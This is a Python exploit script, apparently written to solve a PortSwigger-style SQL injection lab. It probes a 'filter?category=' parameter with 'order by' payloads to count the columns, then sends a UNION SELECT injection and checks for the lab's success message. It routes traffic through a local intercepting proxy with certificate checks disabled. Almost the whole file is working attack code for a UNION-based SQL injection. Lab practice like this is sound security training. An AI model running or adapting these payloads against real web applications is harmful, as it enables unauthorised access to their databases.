import argparse
import urllib3
import time
import logging

import requests



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEADERS = {
    "X-Pwnfox-Color":"green"
}

PROXIES = {
    "http": "127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}


log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def count_columns(url,no_proxy):

    log.info("sending payload to count columns being returned")
    i = 1
    if not no_proxy:
        while True:
            resp = requests.get(url + f"filter?category=Gs' order by {i}-- ",proxies=PROXIES,headers=HEADERS,verify=False)
            if resp.status_code == 500:
                return i-1
            i+=1
    else:
        while True:
            resp = requests.get(url + f"filter?category=Gs' order by {i}-- ",headers=HEADERS,)
            i += 1

            if resp.status_code == 500:
                return i-1



def exploit(url:str, no_proxy:bool):

    cols = count_columns(url,no_proxy)

    log.info(f"[+] found columns {cols}")

    exploit_payload = url + "filter?category=Gs' union select " + ("null," * (cols-1)) + "null -- "

    if not no_proxy:
        r = requests.get(exploit_payload,proxies=PROXIES,verify=False,headers=HEADERS)
        print()
    else:
        r = requests.get(exploit_payload,headers=HEADERS)

    if "Congratulations, you solved the lab!" not in r.text:
        time.sleep(2)
        if not no_proxy:
            r = requests.get(exploit_payload,proxies=PROXIES,verify=False,headers=HEADERS)
        else:
            r = requests.get(exploit_payload,headers=HEADERS)
        if "Congratulations, you solved the lab!" not in r.text:
            log.info("something is wrong. not successful :(")
        else:
            log.info("✅ ok done :)")
    else:
        log.info("✅ ok done :)")


def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--no-proxy", help="to not use any proxy", default=False, action="store_true")
    parser.add_argument("url", help="vulnerable url")
    return parser.parse_args()

def normalize_url(url: str):
    if not url.endswith("/"):
        url = url + "/"
        return url
    return url

if __name__ == "__main__":
    args = parse()
    exploit(normalize_url(args.url),args.no_proxy)
